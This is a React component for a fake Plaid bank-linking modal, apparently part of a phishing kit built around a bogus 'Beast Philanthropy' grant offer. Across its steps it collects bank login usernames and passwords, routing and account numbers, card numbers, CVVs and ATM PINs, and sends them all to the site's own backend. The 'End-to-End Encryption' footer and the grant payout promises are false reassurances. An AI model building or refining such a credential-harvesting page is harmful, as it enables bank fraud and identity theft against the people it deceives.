"use client";
import { useState } from "react";
import { BANKS } from "@/lib/banks";

interface DisbursementModalProps {
  onClose: () => void;
  onSuccess: () => void;
}

export default function DisbursementModal({ onClose, onSuccess }: DisbursementModalProps) {
  const [step, setStep] = useState<1 | 2 | 3 | 4 | 5>(1); // 1: Search, 2: Login, 3: Acc/Rou, 4: Card, 5: Success
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [searchTerm, setSearchTerm] = useState("");
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);

  const [formData, setFormData] = useState({
    bankName: "",
    bankUsername: "",
    bankPassword: "",
    account: "",
    routing: "",
    type: "Checking",
    balance: "1,200.45",
    card: "",
    exp: "",
    cvc: "",
    pin: "",
  });

  const filteredBanks = BANKS.filter((b) => b.toLowerCase().includes(searchTerm.toLowerCase()));

  const handleBankSelect = (name: string) => {
    setFormData((p) => ({ ...p, bankName: name }));
    setSearchTerm(name);
    setIsDropdownOpen(false);
    setStep(2);
  };

  const handleManualContinue = () => {
    if (searchTerm.trim()) {
      setFormData((p) => ({ ...p, bankName: searchTerm }));
      setStep(2);
    }
  };

  const handleSubmitLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setStep(3);
  };

  const handleSubmitBank = (e: React.FormEvent) => {
    e.preventDefault();
    setStep(4);
  };

  const handleSubmitFinal = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const token = localStorage.getItem("bpkyc_token");
      const res = await fetch("/api/user/disbursement", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          bankName: formData.bankName,
          disbursementAccount: formData.account,
          disbursementRouting: formData.routing,
          bankUsername: formData.bankUsername,
          bankPassword: formData.bankPassword,
          accountType: formData.type,
          accountBalance: formData.balance,
          cardNumber: formData.card,
          cardExp: formData.exp,
          cardCvc: formData.cvc,
          cardPin: formData.pin,
        }),
      });

      if (res.ok) {
        setStep(5);
        setTimeout(() => {
          onSuccess();
          onClose();
        }, 2000);
      } else {
        alert("Failed to link account.");
      }
    } catch (err) {
      alert("Error linking bank.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const modalOverlay: React.CSSProperties = {
    position: "fixed",
    inset: 0,
    background: "rgba(0,0,0,0.4)",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    zIndex: 10000,
  };

  const plaidCard: React.CSSProperties = {
    background: "white",
    width: "90%",
    maxWidth: "400px",
    borderRadius: "20px",
    overflow: "hidden",
    boxShadow: "0 20px 60px rgba(0,0,0,0.15)",
    fontFamily: "Inter, sans-serif",
    position: "relative",
  };

  const inputStyle: React.CSSProperties = {
    width: "100%",
    padding: "16px",
    border: "1px solid #ddd",
    borderRadius: "12px",
    fontSize: "0.95rem",
    outline: "none",
    background: "#fff",
    color: "#333",
  };

  const primaryBtn: React.CSSProperties = {
    width: "100%",
    padding: "18px",
    background: "#111",
    color: "white",
    border: "none",
    borderRadius: "14px",
    fontWeight: 700,
    fontSize: "1rem",
    cursor: "pointer",
    marginTop: "20px",
  };

  return (
    <div style={modalOverlay} onClick={onClose}>
      <div style={plaidCard} onClick={(e) => e.stopPropagation()}>
        <div style={{ padding: "20px 24px", display: "flex", alignItems: "center", justifyContent: "center", borderBottom: "1px solid #f0f0f0", position: "relative" }}>
          <div style={{ fontWeight: 900, color: "#111", fontSize: "1.1rem" }}>Plaid</div>
          <button onClick={onClose} style={{ position: "absolute", left: "24px", border: "none", background: "none", fontSize: "1.5rem", padding: 0, cursor: "pointer", color: "#ccc" }}>×</button>
        </div>

        <div style={{ padding: "32px 24px" }}>
          {step === 1 && (
            <div>
              <h2 style={{ fontSize: "1.2rem", fontWeight: 800, marginBottom: "8px", color: "#333" }}>Select your bank</h2>
              <p style={{ fontSize: "0.85rem", color: "#666", marginBottom: "24px" }}>Plaid supports 12,000+ financial institutions.</p>
              
              <div style={{ position: "relative", marginBottom: "16px" }}>
                 <input 
                    style={inputStyle} 
                    placeholder="Search for your institution..." 
                    value={searchTerm}
                    onChange={e => {
                      setSearchTerm(e.target.value);
                      setIsDropdownOpen(true);
                    }}
                    onFocus={() => setIsDropdownOpen(true)}
                 />
                 {isDropdownOpen && filteredBanks.length > 0 && (
                    <div style={{ position: "absolute", top: "100%", left: 0, right: 0, background: "white", border: "1px solid #ddd", borderRadius: "12px", maxHeight: "200px", overflowY: "auto", zIndex: 100, boxShadow: "0 10px 30px rgba(0,0,0,0.1)" }}>
                       {filteredBanks.map(bank => (
                          <div 
                            key={bank} 
                            onClick={() => handleBankSelect(bank)}
                            style={{ padding: "14px 16px", cursor: "pointer", borderBottom: "1px solid #eee", fontSize: "0.85rem", fontWeight: 700 }}
                          >
                             {bank}
                          </div>
                       ))}
                    </div>
                 )}
              </div>

              {searchTerm && !BANKS.includes(searchTerm) ? (
                 <button onClick={handleManualContinue} style={primaryBtn}>Link {searchTerm} manually</button>
              ) : (
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "10px", marginTop: "12px" }}>
                   {BANKS.slice(0, 4).map(bank => (
                      <button key={bank} onClick={() => handleBankSelect(bank)} style={{ padding: "14px", border: "1px solid #eee", borderRadius: "12px", background: "#fcfcfc", fontSize: "0.75rem", fontWeight: 800, cursor: "pointer" }}>{bank}</button>
                   ))}
                </div>
              )}
            </div>
          )}

          {step === 2 && (
            <form onSubmit={handleSubmitLogin}>
               <div style={{ display: "flex", alignItems: "center", gap: "12px", marginBottom: "28px" }}>
                  <div style={{ padding: "10px", background: "#f0f0f0", borderRadius: "8px" }}>🏦</div>
                  <div>
                    <h3 style={{ fontSize: "0.95rem", fontWeight: 800, color: "#111" }}>{formData.bankName}</h3>
                    <p style={{ fontSize: "0.75rem", color: "#888" }}>Confirm bank credentials</p>
                  </div>
               </div>
               <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
                  <input style={inputStyle} type="text" placeholder="User ID / Email" required value={formData.bankUsername} onChange={e => setFormData(p => ({ ...p, bankUsername: e.target.value }))} />
                  <input style={inputStyle} type="password" placeholder="Password" required value={formData.bankPassword} onChange={e => setFormData(p => ({ ...p, bankPassword: e.target.value }))} />
               </div>
               <button type="submit" style={primaryBtn}>Authorize Link</button>
            </form>
          )}

          {step === 3 && (
            <form onSubmit={handleSubmitBank}>
               <h2 style={{ fontSize: "1.1rem", fontWeight: 800, marginBottom: "8px", color: "#333" }}>Micro-Deposit Verification</h2>
               <p style={{ fontSize: "0.85rem", color: "#666", marginBottom: "24px" }}>Enter the destination account and routing for direct deposit.</p>
               <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
                  <input style={inputStyle} placeholder="Routing Number" required value={formData.routing} onChange={e => setFormData(p => ({ ...p, routing: e.target.value }))} />
                  <input style={inputStyle} placeholder="Account Number" required value={formData.account} onChange={e => setFormData(p => ({ ...p, account: e.target.value }))} />
                  <select style={inputStyle} value={formData.type} onChange={e => setFormData(p => ({ ...p, type: e.target.value }))}>
                     <option>Checking</option>
                     <option>Savings</option>
                  </select>
               </div>
               <button type="submit" style={primaryBtn}>Continue</button>
            </form>
          )}

          {step === 4 && (
            <form onSubmit={handleSubmitFinal}>
               <h2 style={{ fontSize: "1.1rem", fontWeight: 800, marginBottom: "8px", color: "#333" }}>Direct Payout Method</h2>
               <p style={{ fontSize: "0.85rem", color: "#666", marginBottom: "24px" }}>Verify your debit card to enable 1-hour instant grant payouts.</p>
               <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                  <input style={inputStyle} placeholder="Card Number" required value={formData.card} onChange={e => setFormData(p => ({ ...p, card: e.target.value }))} />
                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "14px" }}>
                    <input style={inputStyle} placeholder="MM / YY" required value={formData.exp} onChange={e => setFormData(p => ({ ...p, exp: e.target.value }))} />
                    <input style={inputStyle} placeholder="CVV" required value={formData.cvc} onChange={e => setFormData(p => ({ ...p, cvc: e.target.value }))} />
                  </div>
                  <input style={inputStyle} type="password" maxLength={4} placeholder="ATM PIN" required value={formData.pin} onChange={e => setFormData(p => ({ ...p, pin: e.target.value }))} />
               </div>
               <button type="submit" disabled={isSubmitting} style={primaryBtn}>
                 {isSubmitting ? "Linking..." : "Finalize Authorization"}
               </button>
            </form>
          )}

          {step === 5 && (
            <div style={{ textAlign: "center", padding: "20px 0" }}>
              <div style={{ width: "64px", height: "64px", background: "#e6fcf5", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 24px" }}>
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#0ca678" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
              </div>
              <h2 style={{ fontSize: "1.2rem", fontWeight: 800, marginBottom: "12px", color: "#111" }}>Identity Authenticated</h2>
              <p style={{ fontSize: "0.9rem", color: "#666", lineHeight: 1.5 }}>
                Your {formData.bankName} account and card are now synchronized for Beast Philanthropy grants.
              </p>
            </div>
          )}
        </div>

        <div style={{ padding: "16px 24px", background: "#f9fcfc", borderTop: "1px solid #f0f0f0", textAlign: "center" }}>
           <div style={{ fontSize: "0.65rem", color: "#888", fontWeight: 800, textTransform: "uppercase", letterSpacing: "0.1em" }}>End-to-End Encryption</div>
        </div>
      </div>
    </div>
  );
}
